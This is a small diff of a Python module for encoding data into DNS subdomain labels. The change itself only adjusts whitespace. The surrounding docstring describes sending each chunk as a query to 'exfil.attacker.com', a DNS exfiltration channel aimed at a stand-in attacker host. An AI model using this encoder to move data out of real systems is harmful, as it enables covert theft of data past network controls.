@@ -18,7 +18,7 @@ def dns_encode_payload(data: bytes, *, label_max: int = 60) -> list[str]:
     subdomain query: ``<index>.<label>.exfil.attacker.com``.
     """
     encoded = base64.b32encode(data).decode().rstrip("=")
-    return [encoded[i: i + label_max] for i in range(0, len(encoded), label_max)]
+    return [encoded[i : i + label_max] for i in range(0, len(encoded), label_max)]
 
 
 def dns_decode_payload(labels: list[str]) -> bytes:
